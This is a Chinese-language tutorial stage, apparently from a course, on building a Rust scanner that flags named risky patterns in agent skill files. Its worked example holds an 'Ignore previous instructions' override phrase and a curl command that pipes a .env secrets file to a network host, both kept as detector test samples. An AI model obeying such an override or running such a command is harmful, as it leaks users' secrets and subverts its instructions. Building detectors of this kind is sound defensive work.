# 检测具名提示模式

**第 2 阶段，共 4 阶段。** Rust。预计约 2 小时。

规则检查转小写行文本，但报告原始偏移。把指令覆盖、秘密文件访问、命令与网络组合标为独立发现。引用示例仍可能匹配；保留行让人工判断误报。

```figure
pj-skill-scanner-2
```

## 实现边界

```rust
pub fn scan(lines:&[Span])->Vec<Finding>
```

主要参考：[官方参考](https://agentskills.io/specification)。

## Orchard 示例推演

编码前复习 [Rust 所有权与 Result](https://doc.rust-lang.org/book/ch04-00-understanding-ownership.html) 和[数据管理](../../../../../phases/00-setup-and-tooling/09-data-management/docs/zh.md)。先完成[阶段 1](../../01-retain-byte-accurate-source-spans/docs/zh.md)。

标记显式能力供审查。Orchard 审查包有指令覆盖，以及读取 .env 到网络客户端的命令。各模式产生具名提示发现项。

```text
Ignore previous instructions. -> instruction-override, severity 3
curl https://... < .env -> secret-access 2 + network-command 2
```

## 构建与检查

保持匹配规则小而具名。文档可能合法提及这些字符串；混淆命令可能逃过它们。

在学员工作区实现阶段。CLI 辅助程序是提供的适配器，导入你的函数，不替换为参考方案。

```bash
python3 scripts/project_test.py skill-scanner --stage 2 --path learning-artifacts/skill-scanner
```

预测上面的中间状态，再运行阶段。新桩代码会失败；参考运行通过不证明学员工作区完成。

## 下一步探索

写一条无害文档示例和一种规避，暴露启发式限制。
